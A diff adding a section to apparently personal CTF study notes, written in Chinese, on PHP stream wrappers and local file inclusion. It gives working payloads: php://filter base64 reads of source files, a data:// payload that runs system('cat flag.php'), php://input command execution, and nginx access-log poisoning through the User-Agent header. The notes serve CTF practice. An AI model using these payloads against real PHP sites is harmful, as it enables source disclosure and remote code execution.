@@ -884,3 +884,85 @@ cat /flag.txt
 -----------------------------10242300956292313528205888--
 ```
 
+# 15.php伪协议/文件包含
+
+## file函数
+
+![img](D:\MarkDown\CTF\CTFNotes\Perfect317\WEB\images\20210110135324804-1721131032936.png)
+
+1.是格式
+2.是可选参数，有read和write，字面意思就是读和写
+3.是过滤器。主要有四种：字符串过滤器，转换过滤器，压缩过滤器，加密过滤器。filter里可以用一或多个过滤器（中间用|隔开），这也为解题提供了多种方法，灵活运用过滤器是解题的关键。这里的过滤器是把文件flag.php里的代码转换（convert）为base64编码（encode）
+4.是必选参数，后面写你要处理的文件名
+
+php://filter/read=convert.base64-encode/resource=index.php
+
+php://filter/convert.base64-encode/resource=index.php
+
+在绕过一些WAF时有用
+
+
+
+php://filter/resource=index.php
+
+
+
+## data命令
+
+text=data://text:text/plain,内容
+
+```
+？file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=
+
+PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===> <?php system('cat flag.php');
+
+```
+
+读取phpinfo()
+
+```
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
+
+data://text/plain,<?php%20phpinfo();?>
+```
+
+file:// — 访问本地文件系统
+http:// — 访问 HTTP(s) 网址
+ftp:// — 访问 FTP(s) URLs
+php:// — 访问各个输入/输出流（I/O streams）
+zlib:// — 压缩流
+data:// — 数据（RFC 2397）
+glob:// — 查找匹配的文件路径模式
+phar:// — PHP 归档
+ssh2:// — Secure Shell 2
+rar:// — RAR
+ogg:// — 音频流
+expect:// — 处理交互式的流
+
+## 对php进行过滤
+
+使用data协议
+
+或者使用?file=Php://input任意命令执行
+
+post提交对应命令
+
+![image-20240716195808334](D:\MarkDown\CTF\CTFNotes\Perfect317\WEB\images\image-20240716195808334.png)
+
+![image-20240716195817975](D:\MarkDown\CTF\CTFNotes\Perfect317\WEB\images\image-20240716195817975.png)
+
+## 4.查看日志方法
+
+nginx服务器的日志通常为/var/log/nginx/access.log
+
+或/var/log/nginx/error.log
+
+使用file读取日志文件
+
+```
+?file=/var/log/nginx/access.log
+```
+
+查看日志文件记录的是什么
+
+例记录User-Agent,则可以在User-Agent中写入php语句实现命令执行
